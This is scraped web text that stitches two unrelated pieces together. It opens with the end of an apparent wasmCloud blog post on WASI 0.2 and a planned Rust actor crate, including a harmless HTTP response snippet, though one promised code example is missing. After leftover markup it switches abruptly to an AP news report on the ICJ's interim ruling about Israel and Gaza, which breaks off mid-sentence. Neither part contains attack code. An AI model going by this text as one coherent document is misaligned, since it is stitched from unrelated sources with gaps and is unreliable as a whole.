<p>As language toolchains evolve to better and better support WASI, what you can expect to see is Wasm-first frameworks for developing applications using standard interfaces. One of these such frameworks will be the <a href="https://github.com/wasmCloud/wasmCloud/tree/main/crates/actor" target="_blank" rel="noopener noreferrer">wasmcloud-actor</a> crate, which will provide both access to a stable set of WASI interfaces and nicer abstractions around specific functionality. Take the above HTTP request handler code and how we respond with an HTTP response of “Hello from Rust”:</p>
<div><pre tabindex="0"><code><span><span>let</span><span> response </span><span>=</span><span> </span><span>OutgoingResponse</span><span>::</span><span>new</span><span>(</span><span>Fields</span><span>::</span><span>new</span><span>(</span><span>)</span><span>)</span><span>;</span><span></span><br></span><span><span>response</span><span>.</span><span>set_status_code</span><span>(</span><span>200</span><span>)</span><span>.</span><span>unwrap</span><span>(</span><span>)</span><span>;</span><span></span><br></span><span><span></span><span>let</span><span> response_body </span><span>=</span><span> response</span><span>.</span><span>body</span><span>(</span><span>)</span><span>.</span><span>unwrap</span><span>(</span><span>)</span><span>;</span><span></span><br></span><span><span>response_body</span><br></span><span><span>    </span><span>.</span><span>write</span><span>(</span><span>)</span><span></span><br></span><span><span>    </span><span>.</span><span>unwrap</span><span>(</span><span>)</span><span></span><br></span><span><span>    </span><span>.</span><span>blocking_write_and_flush</span><span>(</span><span>b"Hello from Rust!\n"</span><span>)</span><span></span><br></span><span><span>    </span><span>.</span><span>unwrap</span><span>(</span><span>)</span><span>;</span><span></span><br></span><span><span></span><span>OutgoingBody</span><span>::</span><span>finish</span><span>(</span><span>response_body</span><span>,</span><span> </span><span>None</span><span>)</span><span>.</span><span>expect</span><span>(</span><span>"failed to finish response body"</span><span>)</span><span>;</span><span></span><br></span><span><span></span><span>ResponseOutparam</span><span>::</span><span>set</span><span>(</span><span>response_out</span><span>,</span><span> </span><span>Ok</span><span>(</span><span>response</span><span>)</span><span>)</span><span>;</span><br></span></code></pre></div>
<p>The code I personally would want to write is something like the original abstraction. Avoiding modifying traits and the standard way to define exports, we may have an abstraction like:</p>

<p>Check it out! A much nicer abstraction around returning an HTTP request, and all we had to do was pull the generated WASI structures behind a more idiomatic API. The above is just sample code I wrote for this blog, so our actual implementation might be different at the end of the day (and even better). This should, however, gives a sense of how library developers will use WASI APIs when the target architecture is Wasm. Even better, the <code>wasmcloud-actor</code> crate will still work out-of-the-box with tools like <code>wasmtime-serve</code>, as there are zero wasmCloud specific APIs used. That being said, this kind of library belongs in an upstream location like the Bytecode Alliance or in the language itself, and this is an intermediate solution unless we see evidence that we should keep the library around for good.</p>
<p>We will see libraries emerge in each language that demonstrates good Wasm component support, and I expect to see something like this for Rust, TinyGo, Python, JavaScript, C/C++, and C# in the near future. We may even see this support built into the standard libraries of these languages. Go for, example, <a href="https://github.com/golang/go/issues/42372" target="_blank" rel="noopener noreferrer">just resurfaced support for the wasmexport directive</a>, enabling libraries like <code>net/http</code> to have WASI implementations.</p>
<h2 id="conclusion">Conclusion<a href="#conclusion" aria-label="Direct link to Conclusion" title="Direct link to Conclusion">​</a></h2>
<p>We are, arguably, reaching the most exciting period of the wasmCloud project to-date. The stabilization of WASI 0.2.0, alongside native support for components in wasmCloud, lets us support every Wasm component language that uses the same WIT definitions. Even as WASI proposals continue to evolve, we now have a stable base to adapt those interfaces to ensure future stability. I firmly believe that this enables the community to truly collaborate on furthering language support, and writing real applications with WebAssembly, and I look forward to being at the forefront of that.</p>
<p>If you have any questions or concerns, please drop by our <a href="https://slack.wasmcloud.com/" target="_blank" rel="noopener noreferrer">Slack</a> and let's have a discussion. While the new interfaces look different from what a seasoned wasmCloud developer is used to, they enable us to truly benefit from and contribute to WebAssembly standards, and the best experience is just within arm's reach.</p></div></div>]]></description>

        AP AUDIO: Top UN court orders Israel to prevent genocide in Gaza but stops short of ordering cease-fire.
    </h2>
    
    
    <p>The president of the International Court of Justice, Joan E. Donoghue, says a Hamas attack on October 7, 2023, triggered a major response by Israel.</p>
    
</div>



<p>The ruling amounted to an overwhelming rebuke of Israel’s wartime conduct and added to mounting international pressure to halt the nearly 4-month-old offensive, which <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/israel-hamas-11-3-2023-gaza-camp-8a25acaf136b897492158d128bf5742d" target="_blank" rel="noopener">has killed</a></span> more than 26,000 Palestinians, <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/palestinians-gaza-israel-bombing-destruction-hamas-reconstruction-f299a28410b70ee05dd764df97d8d3a0" target="_blank" rel="noopener">decimated vast swaths of Gaza</a></span> and driven nearly 85% of its 2.3 million people from their homes.</p>
    
<p>Allowing the accusations to stand stung the government of Israel, which was founded as a Jewish state after the Nazi slaughter of 6 million Jews during World War II.</p><p>Israeli Prime Minister Benjamin Netanyahu said the fact that the court was willing to discuss the genocide charges was a “mark of shame that will not be erased for generations.” He also vowed to press ahead with the war.</p>
    

<p>The power of the ruling was magnified by its timing, coming on the eve of International Holocaust Remembrance Day.</p><p>“Those truly needing to stand trial are those that murdered and kidnapped children, women and the elderly,” former Israeli Defense Minister Benny Gantz said, referring to Hamas militants who <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/israel-palestinians-hamas-attack-military-war-a8f63b07641212f0de61861844e5e71e" target="_blank" rel="noopener">stormed through Israeli communities</a></span> on Oct. 7 in the attack that set off the war. The assault killed some 1,200 people and resulted in another 250 being kidnapped.</p><p>The court also called on Hamas to release the hostages who are still in captivity. Hamas urged the international community to make Israel carry out the court’s orders.</p><p>Many of the measures were approved by an overwhelming majority of the judges. Of the six orders, an Israeli judge voted in favor of two — an order for humanitarian aid and another for the prevention of inflammatory speech.</p><p>Israeli Judge Aharon Barak said he supported those orders in the hope that they would “help to decrease tensions and discourage damaging rhetoric” while easing the ”consequences of the armed conflict for the most vulnerable.”</p>
    

<p>Such provisional measures issued by the world court are legally binding, but it is not clear if Israel will comply with them.</p><p>“We will continue to do what is necessary to defend our country and defend our people,” said Netanyahu, who pushed back against the ruling in two languages. In a message aimed at his domestic audience, the tone was more defiant in Hebrew, and he stopped short of overtly criticizing the court in English.</p><p>The court ruled that Israel must do all it can to prevent genocide, including refraining from killing Palestinians or causing harm to them. It also ruled that Israel urgently needs to get basic aid to Gaza and that the country should punish any incitement to genocide, among other measures.</p><p>The panel told Israel to submit a report on measures taken within a month.</p><p>“That’s a time that the court could come back and say, ‘You have not met the orders. You have not complied. Now we find you are in the midst of committing genocide,’” said Mary Ellen O’Connell, a professor of law and international peace studies at Notre Dame University’s Kroc Institute.</p>
    

<p>Friday’s decision was an interim ruling. It could take years for the court to consider all aspects of <span><a data-gtm-enhancement-style="LinkEnhancementA" href="https://apnews.com/article/world-court-israel-genocide-gaza-south-africa-774ab3c3d57fd7bcc627602eaf47fd98?utm_source=copy&amp;utm_medium=share" target="_blank" rel="noopener">South Africa’s</a></span> genocide allegations.</p><p>In Israel, commentators said the decision not to order a cease-fire was received with some relief since it helped Israel avoid a collision with a top U.N. body.</p><p>Palestinians and their supporters said the court took an important step toward holding Israel accountable. The Foreign Ministry of the internationally backed Palestinian self-rule government in the West Bank said the ruling “should serve as a wake-up call for Israel and actors who enabled its entrenched impunity,” in an apparent reference to the United States, Israel’s chief ally.</p><p>The U.S. repeated its position that Israel must “take all possible steps” to minimize harm to civilians, increase humanitarian aid and curb “dehumanizing rhetoric.”</p><p>“We continue to believe that allegations of genocide are unfounded,” the State Department said in a statement.</p>
    

<p>The South African government said the ruling determined that “Israel’s actions in Gaza are plausibly genocidal.”</p><p>“There is no credible basis for Israel to continue to claim that its military actions are in full compliance with international law, including the Genocide Convention,” the government said in a statement.</p><p>Israel often boycotts international tribunals and U.N. investigations, saying they are unfair and biased.
